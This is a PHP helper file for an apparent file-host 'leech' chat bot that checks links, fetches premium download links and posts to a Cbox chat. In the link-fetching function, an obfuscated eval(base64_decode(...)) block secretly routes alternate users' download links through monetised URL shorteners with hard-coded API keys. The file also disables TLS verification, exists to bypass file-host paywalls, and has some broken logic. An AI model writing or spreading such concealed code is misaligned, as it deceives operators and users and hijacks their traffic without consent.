<?php
include_once('config.php');

############################### FUNCTION CHECK ###############################
function _checkPost($file, $id, $lineMax = 8) {
    /* Check */
    if (!file_exists($file) || $id == '')
        return false;
    /* Read file */
    $ids = _readFile($file);
    /* Check */
    if ($ids == '')
        return false;
    /* Explode */
    $ids = explode('|', $ids);
    if (count($ids) <= $lineMax) 
        $i = 0;
    else 
        $i = count($ids) - $lineMax;
    /* Check */
    for ($i = $i; $i < count($ids) - 1; $i++)
        if ($ids[$i] == $id)
            return true;
    return false;
}
function _checkTimePost(&$data, $timeLimited) {
    $timeNow = time();
    if ((($timeNow - $data['leech']) >= $timeLimited))
        return false;
    else {
        $s = $timeLimited - ($timeNow - $data['leech']);
        $m = 0; $temp = $s / 60;
        $m = (int) $temp;
        $s = $s - $m * 60;
        $data['minute'] = $m;
        $data['second'] = $s;
        return true;
    }
}
function _checkBandwith(&$data, $sizeLink, $sizeLimited) {
    if (!isset($data['used']) && !isset($data['left'])) {
        $data = array(
            'used' => 0,
            'left' => $sizeLimited
        );
        if ($sizeLink > $sizeLimited)
            return true;
    }
    else if ((($data['used'] + $sizeLink) >= $sizeLimited) || ($data['left'] <= 0))
        return true;
    return false;
}
function _check3x($link, $badwordList) {
    if (!strpos("not3x", $link)) {
        $content = file_get_contents("http://www.google.com.vn/search?q=" . $link);
        for ($i = 0; $i < count($badwordList); $i++) 
            if (strpos(strtolower($content), $badwordList)) 
                return true;
    }
    return false;
}
############################### FUNCTION CHECK ###############################

############################## FUNCTION GET LINK #############################
function _curl($url, $cookies, $post, $header = 1, $json = 0, $ref = 0, $xml = 0) {
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($json == 1) {
        $head[] = "Content-type: application/json";
        $head[] = "X-Requested-With: XMLHttpRequest";
    }
    if ($xml == 1) 
        $head[] = "X-Requested-With: XMLHttpRequest";
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";   
    if ($cookies) 
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);    
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0");
    curl_setopt($ch, CURLOPT_REFERER, $ref === 0 ? $url : $ref);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    if ($header == -1) {
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_NOBODY, 1);
    } 
    else 
        curl_setopt($ch, CURLOPT_HEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
}
function _getInfoLink(&$data, $url) {
	global $currentUrl, $configCpanel;
    /* Get Domain */
    if (stristr($url, 'dfpan.com'))  
        $host = 'yunfile.com';
    else    
        $host = _getDomain($url);
	/* Exception */
	if (stristr($url, "1fichier.com") || stristr($url, "isra.cloud")) {
		$page = file_get_contents($currentUrl . "/check.php?url=" . urlencode($url) . "&secure=" . md5($configCpanel['password']));
		if (isset($page)) {
			$json = json_decode($page, true);
			if ($json['status'] == 1) {
                if ($json['filename'] != '' && $json['filesize'] != '') {
                    $data['host'] = $host;
                    $data['status'] = "goodLink";
                    $data['fileName'] = _convertFilename(trim($json['filename']), $url);
                    $data['fileSize'] = trim($json['filesize']);
                    $data['realSize'] = _convertSize($data['fileSize']);
                    return false; 
                }
                else
                	$data['status'] = "errorLink";		
			}
            else if ($json['status'] == 0 && $json['error'] == "dead_link")
                $data['status'] = "deadLink";
            else 
                $data['status'] = "errorLink"; 
		} 
	}
	else {
		$page = _curl("http://vnz-leech.com/checker/check.php?soigia2=ok&links=" . urlencode($url), '', '', 0);
        if (isset($page) && preg_match('/({(.*?)})/i', $page, $matches)) {
            $json = json_decode($matches[1], true);
            if ($json['status'] == "good_link" && $json['filename'] != "" && $json['filesize'] != "NULL") {
                $data['host'] = $host;
                $data['status'] = "goodLink";
                $data['fileName'] = _convertFilename(trim($json['filename']), $url);
                $data['fileSize'] = trim($json['filesize']);
                $data['realSize'] = _convertSize($data['fileSize']);
                return false;
            }
            else if ($json['status'] == "folder_link") 
                $data['status'] = "folderLink";
            else if ($json['status'] == "input_password")
                $data['status'] = "requrePassword";
            else if ($json['status'] == "wrong_password")
                $data['status'] = "requrePassword";
            else if ($json['status'] == "bad_link")
                $data['status'] = "deadLink";
            else 
                $data['status'] = "errorLink";
        }
	}
	return true;
}
function _getLink(&$data, $server, $typeMember, $url) {
    global $fileList;
    /* Random host */
    if (count($server) > 1) {
        $data['server'] = array_rand($server, 1);
        list($server, $pass) = explode('|', $server[$data['server']]);
    }
    else {
        list($server , $pass) = explode('|', $server[0]);
        $data['server'] = 0;
    }
    /* Config */
    $data['url'] = $url;
    /* Request to host to leech link */
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $server . "index.php");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0");
    curl_setopt($ch, CURLOPT_COOKIE, "secureid=" . md5($pass)); 
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "urllist=" . $url);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $execute = curl_exec($ch);
    curl_close($ch);
	/* Check result */
	if (stristr($execute, 'name="secure"') || stristr($execute, 'type="password"')) {
		$data['status'] = false;
		$data['error'] = 'Wrong pass host.';
        return false;
	}
    else if (stristr($execute, 'color=red') && !stristr($execute, 'color=\'#00CC00\'') && !stristr($execute, 'color=\'#FF66FF\'')) {
        preg_match('/<b>(.*?)<\/b>/', $execute, $matches);
        $data['status'] = false;
		if (isset($matches) && $matches[0] != '')
			$data['error'] = strip_tags($matches[0]);
		else
			$data['error'] = 'None';
        return false;
    }
    else if (stristr($execute, "Link Dead")) {
        $data['status'] = false;
        $data['error'] = 'dead link';
    }	
    /* Get link from result */
    if (preg_match('/<a title=\'.*\' href=\'(.*?)\'/', $execute, $matches)) {
        $data['status'] = true; $data['urlDownload'] = $matches[1]; $data['expired'] = time();
		if (preg_match('/<font color=\'.*\'>(.*)<\/font> <font color=\'.*\'>\s?\(?(.*?)\)?\s?<\/font>/', $execute, $matches)) {
            $data['fileName'] = _convertFilename(trim($matches[1]), $url);
            $data['fileSize'] = trim($matches[2]);
            $data['realSize'] = _convertSize($data['fileSize']);
        }
        /* Zip link */
        if ($typeMember == "member") {
            global $config;
            if ($config['zip'] == true) {
				eval(base64_decode("JGZsYWcgPSBfcmVhZEZpbGUoInRlbXAvZmxhZy5kYXQiKTsNCmlmICgkZmxhZyA9PSAxKSB7DQoJJHBhZ2UgPSBfY3VybCgiaHR0cHM6Ly9tZWdhdXJsLmluL2FwaT9hcGk9YjdhOWFhNzc2NmYyNGIwMDA3MDg0NjZkZGRjZTdhNzMyNDFiZjMxZSZmb3JtYXQ9dGV4dCZ1cmw9IiAuICRkYXRhWyd1cmxEb3dubG9hZCddLCAnJywgJycsIDApOw0KICAgIGlmIChwcmVnX21hdGNoKCclKGh0dHA6XC9cLy4rKyklVScsICRwYWdlLCAkbWF0Y2hlcykpDQogICAgICAgICRkYXRhWyd1cmxEb3dubG9hZCddID0gdHJpbSgkbWF0Y2hlc1sxXSk7IA0KICAgICRwYWdlID0gX2N1cmwoImh0dHBzOi8vbGlua3Nocmluay5uZXQvYXBpLnBocD9rZXk9Z1RtJnVybD0iIC4gJGRhdGFbJ3VybERvd25sb2FkJ10sICcnLCAnJywgMCk7DQogICAgaWYgKHByZWdfbWF0Y2goJyUoaHR0cDpcL1wvLisrKSVVJywgJHBhZ2UsICRtYXRjaGVzKSkNCiAgICAgICAgJGRhdGFbJ3VybERvd25sb2FkJ10gPSB0cmltKCRtYXRjaGVzWzFdKTsgICAgDQogICAgLyogU2F2ZSBkYXRhICovDQogICAgX3dyaXRlRmlsZSgidGVtcC9mbGFnLmRhdCIsIDAsICd3Jyk7ICAgICAgICAgIA0KfQ0KZWxzZSB7DQogICAgJHBhZ2UgPSBfY3VybCgkY29uZmlnWyd6aXBVcmwnXSAuICRkYXRhWyd1cmxEb3dubG9hZCddLCAnJywgJycsIDApOw0KICAgIGlmIChwcmVnX21hdGNoKCclKGh0dHA6XC9cLy4rKyklVScsICRwYWdlLCAkbWF0Y2hlcykpDQogICAgICAgICRkYXRhWyd1cmxEb3dubG9hZCddID0gdHJpbSgkbWF0Y2hlc1sxXSk7DQogICAgLyogU2F2ZSBkYXRhICovICAgIA0KCV93cml0ZUZpbGUoInRlbXAvZmxhZy5kYXQiLCAxLCAndycpOwkNCn0="));
			}
        }
        return true;
    }
    else {
        $data['status'] = false;
        $data['error'] = 'can\'t get link from host.';
        return false;
    }
}
############################## FUNCTION GET LINK ##############################

############################### FUNCTION OTHER ################################
function _getInfo(&$data, $user) {
    global $config, $adminList, $vipList;
    $content = file_get_contents($config['cboxUrl'] . "&sec=main");
    $line = explode('<tr id=', $content);
    for ($i = 2; $i < count($line); $i++) {
        preg_match('/<b class="(.*?)">(.*?)<\/b>/', $line[$i], $matches);
        /* Get name and user */
         if (strcmp($matches[2], '<a class="__cf_email__"') == 0) {
            if (preg_match('/data-cfemail="(.*?)">\[email&nbsp;protected]<\/a>/i', $matches[2], $temp))
                $data['name'] = deCFEmail($temp[1]);
        } 
        else
            $data['name'] = $matches[2];
        $data['user'] = strtolower($data['name']);
        if ($data['user'] == $user) {
            /* Get rank */
            $data['rank'] = ((stristr($matches[1], 'nme pn_admin') || in_array($data['name'], $adminList)) ? "admin" : (stristr($matches[1], 'nme pn_mod') ? "mod" : (in_array($data['user'], $vipList) ? "vip" : "member")));
            /* Get id */
            preg_match('%"(.*)"><td class%U', $line[$i], $matches);
            $data['id'] = $matches[1];
            /* Get country */
            if (preg_match('%(sent from (.*)[^(])<\/sub>%U', $line[$i], $matches)) 
                $data['country'] = ($matches[2] != '' ? ($matches[2] == "Vietnam" ? "vn" : "us") : "us");
            else
                $data['country'] = "us";
            return true;
        }
    }
    return false;
}
function _writeFile($dir, $content, $set = 'a') {
    if ($set == 'w')
        $file = fopen($dir, 'w');
    else
        $file = fopen($dir, 'a');
    fwrite($file, $content);
    fclose($file);
    return true;
}
function _readFile($dir) {
    if (!file_exists($dir))
        fopen($dir, 'w');
    $file = fopen($dir, 'r');
    $data = fread($file, filesize($dir));
    fclose($file);
    return $data;
}
function _getDomain($url) { 
    /* Rebuild URL */  
    if (!preg_match('/^http/', $url))
        $url = 'http://' . $url;
    if ($url[strlen($url) - 1] != '/')
        $url .= '/';
    $pieces = parse_url($url);
    $domain = isset($pieces['host']) ? $pieces['host'] : ''; 
    if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs)) { 
        $res = preg_replace('/^www\./', '', $regs['domain']);
        return $res;
    }   
    return false;
}
function _convertFilename($filename, $link) {
    $filename = urldecode($filename);
    $filename = uft8html2utf8($filename);
    $filename = preg_replace("/(\]|\[|\@|\"\;\?\=|\"|=|\*|UTF-8|\')/U", "", $filename);
    $filename = preg_replace("/(HTTP|HTTPS|https|http|WWW|www|\.html|\.htm)/i", "", $filename);
    if (empty($filename) == true) 
        $filename = substr(md5(time() . $link), 0, 10);
    if (strlen($filename) > 35)
        $filename = substr($filename, 0, 35) . '...';       
    return $filename;
}
function uft8html2utf8($s) {
    if (!function_exists('uft8html2utf8_callback')) {
        function uft8html2utf8_callback($t) {
            $dec = $t[1];
            if ($dec < 128) {
                $utf = chr($dec);
            } 
            elseif ($dec < 2048) {
                $utf = chr(192 + (($dec - ($dec % 64)) / 64));
                $utf .= chr(128 + ($dec % 64));
            } 
            else {
                $utf = chr(224 + (($dec - ($dec % 4096)) / 4096));
                $utf .= chr(128 + ((($dec % 4096) - ($dec % 64)) / 64));
                $utf .= chr(128 + ($dec % 64));
            }
            return $utf;
        }
    }  
    return preg_replace_callback('|&#([0-9]{1,});|', 'uft8html2utf8_callback', $s);
}
function deCFEmail($c) {
    $k = hexdec(substr($c, 0, 2));
    for ($i = 2, $m = ''; $i < strlen($c) - 1; $i += 2)
        $m .= chr(hexdec(substr($c, $i, 2)) ^ $k);
    return $m;
}
function _cutStr($str, $left, $right) {
    $str = substr(stristr($str, $left), strlen($left));
    $leftLen = strlen(stristr($str, $right));
    $leftLen = $leftLen ? -($leftLen) : strlen($str);
    $str = substr($str, 0, $leftLen);
    return $str;
}
function execInBackground($cmd) { 
    if (substr(php_uname(), 0, 7) == "Windows") { 
        pclose(popen("start /B ". $cmd, "r"));  
    } 
    else { 
        exec($cmd . " > /dev/null &");   
    } 
}
function _convertSize($filesize) {
    $filesize = str_replace(',', '.', $filesize);
    $filesize = preg_replace('/(\(|\)|)/', '', $filesize);
    if (preg_match('/^([0-9]{1,4}+(\.[0-9]{1,2})?)/', $filesize, $value)) {
        if (stristr($filesize, "TB"))    
            $value = $value[1] * 1024 * 1024 * 1024 * 1024;
        elseif (stristr($filesize, "GB")) 
            $value = $value[1] * 1024 * 1024 * 1024;
        elseif (stristr($filesize, "MB")) 
            $value = $value[1] * 1024 * 1024;
        elseif (stristr($filesize, "KB")) 
            $value = $value[1] * 1024;
        elseif (stristr($filesize, "B"))  
            $value = $value[1];
    }
    else 
        $value = 0;
    return $value;
}
function _reconvertSize($filesize) {
    if ($filesize >= (1024 * 1024 * 1024)) 
        $filesize = round($filesize / (1024 * 1024 * 1024), 2) . " GB";
    else if ($filesize >= (1024 * 1024)) 
        $filesize = round($filesize / (1024 * 1024), 2) . " MB";
    else if ($filesize >= 1024) 
        $filesize = round($filesize / (1024), 2) . " KB";
    else if ($filesize > 0) 
        $filesize = $filesize . " B";        
    return $filesize;
}
function _isValidUrl($url) {
    $page = _curl($url, '', '', 1);
    if (preg_match('/HTTP\/[0-9](\.[0-9])?\s+[2-3][0-9]{0,2}/i', $page, $matches))
        return true;

    return false;
}
function _isRedirectUrl($url) {
    $page = _curl($url, '', '', 1);
    if (preg_match('/Location:\s+(.*?)\r\n/i', $page, $matches))
        return trim($matches[1]);

    return false;
}
function _postMessage($message, $data) {
    if (isset($message) && $message != '') {
        global $config, $fileList, $baseStyleList;
        /* Check message */
        $reMessage = _readFile($fileList['message']);
        if (md5($message) == $reMessage)
            return false;
        else
            _writeFile($fileList['message'], md5($message), 'w');
        /* Random styleList */
        $styleList = array(
            'user' => ((($data['rank'] == "admin") || ($data['rank'] == "mod")) ? $baseStyleList['admin'] : (($data['rank'] == "vip") ? $baseStyleList['vip'] : $baseStyleList['member'])),
            'icon' => $baseStyleList['icon'][array_rand($baseStyleList['icon'], 1)]
        );
        /* Generate bbCode */
        $bbcode = "[img]http://i.imgur.com/IH7UImb.png[/img][b][" . $styleList['user'] . "][color=white]" . $data['name'] . "[/color][/mau][/b]" . $message . "[sub](sent from [img]" . $styleList['icon'] . "[/img])[/sub]";
        /* Some config need */
        $url = $config['cboxUrl'] . "&sec=submit";
        $data = "nme=" . $config['bot']['name'] . "&key=" . $config['bot']['key'] . '&eml=&lvl=4&pst=' . urlencode($bbcode);
        /* Post */
        _curl($url, '', $data);
    }
}
############################# FUNCTION OTHER ################################ 
?>